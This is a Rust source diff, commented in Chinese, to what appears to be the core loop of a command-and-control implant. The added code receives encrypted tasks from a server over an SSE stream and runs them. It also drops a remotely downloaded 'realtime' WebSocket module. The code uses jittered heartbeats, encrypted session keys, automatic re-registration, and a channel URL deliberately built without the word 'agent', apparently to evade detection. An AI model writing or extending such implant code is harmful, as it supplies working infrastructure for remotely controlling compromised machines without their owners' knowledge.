@@ -4,8 +4,8 @@ use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
 
 use crate::config::ConfigManager;
-use crate::engine::heartbeat::{heartbeat_tick, jittered_interval};
-use crate::module_manager::{ModuleManager, run_module};
+use crate::engine::heartbeat::{heartbeat_tick, handle_task, jittered_interval};
+use crate::module_manager::ModuleManager;
 
 mod heartbeat;
 mod utils;
@@ -54,6 +54,9 @@ impl AgentEngine {
                     self.http = None;
                     self.session_token.clear();
                     self.profile = None;
+                    // 强制协商新会话密钥：服务端重启后其内存/Mongo 中的 key
+                    // 可能与 agent 持有的失配，保留旧 key 会死循环。
+                    self.crypto.clear_session_key();
                     continue;
                 }
                 other => return other,
@@ -161,36 +164,29 @@ impl AgentEngine {
             ),
         ));
 
-        // WS 需求命令通道：true = 服务端要求实时通道（启动 realtime 模块）；
-        // false = 释放（停止模块）。
-        let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();
-
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
         // the session is lost (e.g. the server restarted).
         let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
-        let hb_ws_cmd = ws_cmd_tx.clone();
-        // 主循环（realtime 模块管理）仍要使用这些值：spawn 前各留一份副本
+        // 主循环（SSE 重注册信号）仍要使用这些值：spawn 前各留一份副本
         let hb_agent_id = agent_id.clone();
         let hb_server_url = server_url.clone();
         let hb_register_path = register_path.clone();
         let hb_session_token = session_token.clone();
+        let hb_profile = profile.clone();
         tokio::spawn(async move {
             let mut hb_http = HttpCommunicator::new(&hb_server_url, &hb_register_path, &hb_register_path, &hb_register_path);
             if !hb_session_token.is_empty() {
                 hb_http.set_session_token(hb_session_token);
             }
-            if let Some(p) = profile {
+            if let Some(p) = hb_profile {
                 hb_http.set_profile(p);
             }
             loop {
                 match heartbeat_tick(&hb_http, &hb_agent_id, hb_key.as_ref(), &hb_mm).await {
-                    Ok(ws_needed) => {
-                        // 每个心跳都同步一次 WS 需求（幂等，服务端状态为准）
-                        let _ = hb_ws_cmd.send(ws_needed);
-                    }
+                    Ok(()) => {}
                     Err(e) if e == "SESSION_LOST" => {
                         libra_common::dlog!("[WARN] session lost — triggering re-registration");
                         let _ = hb_reconnect.send(());
@@ -205,56 +201,88 @@ impl AgentEngine {
             }
         });
 
-        // ── 主循环：realtime 模块生命周期管理 ──
-        // wsNeeded=true → 下载并启动 realtime 模块（模块自建 WS 接管所有
-        // WS 消息处理）；wsNeeded=false → 停止模块。幂等 + 状态跟踪，
-        // 避免每个心跳重复调用。
-        let mut realtime_started = false;
-        let ws_url = self.ws_url_for(&agent_id);
-        let session_key_b64 = hb_key.map(|k| {
-            use base64::Engine as _;
-            base64::engine::general_purpose::STANDARD.encode(k)
+        // ── SSE 任务事件流（唯一任务通道）──
+        // 长连接等待服务端推送任务；断线 3s 退避重连；SESSION_LOST → 重注册。
+        // 任务执行与心跳共用 handle_task（task.id 去重，双通道幂等）。
+        let sse_mm = module_manager.clone();
+        let sse_reconnect = reconnect_tx.clone();
+        let sse_server_url = server_url.clone();
+        let sse_register_path = register_path.clone();
+        let sse_agent_id = agent_id.clone();
+        let sse_session_token = session_token.clone();
+        let sse_profile = profile.clone();
+        let sse_key = hb_key; // Option<[u8;32]> Copy
+        tokio::spawn(async move {
+            use futures_util::StreamExt;
+            let mut sse_http = HttpCommunicator::new(&sse_server_url, &sse_register_path, &sse_register_path, &sse_register_path);
+            if !sse_session_token.is_empty() {
+                sse_http.set_session_token(sse_session_token);
+            }
+            if let Some(p) = sse_profile {
+                sse_http.set_profile(p);
+            }
+            loop {
+                match sse_http.open_events(sse_key.as_ref().unwrap_or(&[0u8; 32])).await {
+                    Ok(resp) => {
+                        let mut stream = resp.bytes_stream();
+                        let mut buf: Vec<u8> = Vec::with_capacity(4096);
+                        loop {
+                            match stream.next().await {
+                                Some(Ok(chunk)) => buf.extend_from_slice(&chunk),
+                                Some(Err(e)) => {
+                                    libra_common::dlog!("[sse] read error: {e}");
+                                    break;
+                                }
+                                None => break,
+                            }
+                            // 按行解析（chunk 可能跨行/多行）
+                            while let Some(pos) = buf.iter().position(|&b| b == b'\n') {
+                                let line: Vec<u8> = buf.drain(..=pos).collect();
+                                let line = String::from_utf8_lossy(&line);
+                                let line = line.trim();
+                                if let Some(data) = line.strip_prefix("data:") {
+                                    let cipher = data.trim();
+                                    if cipher.is_empty() {
+                                        continue;
+                                    }
+                                    match libra_crypto::decrypt_payload(cipher, sse_key.as_ref().unwrap_or(&[0u8; 32])) {
+                                        Ok(plain) => {
+                                            if let Ok(v) = serde_json::from_str::<Value>(&plain) {
+                                                if v["op"].as_str() == Some("task") {
+                                                    match serde_json::from_value::<libra_common::models::AgentTask>(v["data"].clone()) {
+                                                        Ok(task) => handle_task(&sse_http, &task, &sse_agent_id, sse_key.as_ref(), &sse_mm).await,
+                                                        Err(e) => libra_common::dlog!("[sse] task parse failed: {e} | raw={}", v["data"].to_string()),
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        Err(e) => libra_common::dlog!("[sse] decrypt failed: {e}"),
+                                    }
+                                }
+                                // 注释行（: ping）与空行忽略
+                            }
+                        }
+                        libra_common::dlog!("[sse] stream ended — reconnecting");
+                    }
+                    Err(e) if e == "SESSION_LOST" => {
+                        libra_common::dlog!("[sse] session lost — re-registering");
+                        let _ = sse_reconnect.send(());
+                        break;
+                    }
+                    Err(e) => libra_common::dlog!("[sse] open failed: {e}"),
+                }
+                tokio::time::sleep(std::time::Duration::from_secs(3)).await;
+            }
         });
 
+        // ── 主循环：等待重注册信号（SESSION_LOST）──
         loop {
             tokio::select! {
                 _ = reconnect_rx.recv() => {
                     libra_common::dlog!("[INFO] re-registering with server");
                     return Err("SESSION_LOST".into());
                 }
-                Some(need) = ws_cmd_rx.recv() => {
-                    if need && !realtime_started {
-                        let input = serde_json::json!({
-                            "action": "start",
-                            "wsUrl": ws_url,
-                            "agentId": agent_id,
-                            "sessionKey": session_key_b64.clone().unwrap_or_default(),
-                            "sessionToken": session_token,
-                            "serverUrl": server_url,
-                            "registerPath": register_path,
-                        });
-                        let r = run_module(&module_manager, "realtime", input).await;
-                        libra_common::dlog!("[realtime] start: {}", r);
-                        realtime_started = r.contains("\"status\"");
-                    } else if !need && realtime_started {
-                        let r = run_module(&module_manager, "realtime",
-                            serde_json::json!({ "action": "stop" })).await;
-                        libra_common::dlog!("[realtime] stop: {}", r);
-                        realtime_started = false;
-                    }
-                }
             }
         }
-    }
-
-    /// 实时通道 URL（/ws/realtime?channel=，无 agent 字样）。
-    fn ws_url_for(&self, agent_id: &str) -> String {
-        let (scheme, rest) = if self.config.server_url.starts_with("https://") {
-            ("wss://", &self.config.server_url[8..])
-        } else {
-            ("ws://", &self.config.server_url[7..])
-        };
-        let host = rest.trim_end_matches('/');
-        format!("{}{}/ws/realtime?channel={}", scheme, host, agent_id)
     }
 }
